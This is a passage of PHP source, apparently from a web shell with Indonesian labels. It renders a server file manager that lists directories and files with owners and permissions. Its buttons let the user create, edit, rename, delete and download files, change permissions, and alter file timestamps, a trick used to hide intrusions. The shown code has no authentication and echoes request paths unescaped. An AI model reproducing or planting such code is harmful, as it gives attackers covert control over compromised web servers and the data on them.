	<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
		<div class="btn-group">
			<a class="btn btn-outline-light btn-sm" href="?id=filebaru&path=<?php echo $dir; ?>">
				<i class="bi bi-file-earmark-plus-fill"></i> Buat File
			</a>
			<a class="btn btn-outline-light btn-sm" href="?id=dirbaru&path=<?php echo $dir; ?>">
				<i class="bi bi-folder-plus"></i> Buat Dir
			</a>
		</div>
	</td>
</tr>';
foreach($scandir as $dir){
$dt = date("Y-m-d H:i:s", filemtime("$path/$dir"));
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	} else {
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup("$path/$dir");
	}
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
	<td><i class='bi bi-folder2-open' style='color: rgb(255, 202, 26);'></i><a class='text-decoration-none' style='color:rgb(255, 202, 26);' href=\"?path=$path/$dir\">  | $dir |</a></td>
    <td class='text-center'>$dt</td>
    <td class='text-center'>dir</td>
	<td class='text-center'>$downer<gr>/</gr>$dgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$dir")) echo '<gr>';
elseif(!is_readable("$path/$dir")) echo '<rd>';
echo p("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
	<form method=\"POST\" action=\"?option&path=$path\">
		<div class=\"btn-group\">
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"rename\"><i class='bi bi-pencil-fill'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"change_time\"><i class='bi bi-clock'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"change_perm\"><i class='bi bi-key'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"delete\"><i class='bi bi-trash-fill'></i></button>
		</div>
		<input type=\"hidden\" name=\"type\" value=\"dir\">
		<input type=\"hidden\" name=\"name\" value=\"$dir\">
		<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
	</form>
	</td>
</tr>";
}
foreach($scandir as $file){
$ft = date("Y-m-d H:i:s", filemtime("$path/$file"));
	if(!is_file($path.'/'.$file)) continue;
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	} else {
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	} else {
		$fgrp = filegroup("$path/$file");
	}
echo "
<tr>
	<td><i class='bi bi-file-earmark-text' style='color: rgb(0, 0, 0);'></i><a class='text-decoration-none' style='color: #fff;' href=\"?filesrc=$path/$file&path=$path\"> » $file</a></td>
    <td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner<gr>/</gr>$fgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$file")) echo '<gr>';
elseif(!is_readable("$path/$file")) echo '<rd>';
echo p("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
		<form method=\"POST\" action=\"?option&path=$path\">
			<div class=\"btn-group\">
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"rename\"><i class='bi bi-pencil-fill'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"change_time\"><i class='bi bi-clock'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"change_perm\"><i class='bi bi-key'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"delete\"><i class='bi bi-trash-fill'></i></button>
			</div>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
		</form>
	</td>
</tr>";
	}
}
echo "
</tbody>
</table>
<div class='text-secondary'>&copy; ".date("Y")." $_n</div>
</div>
</div>
</body>
</html>";
?>
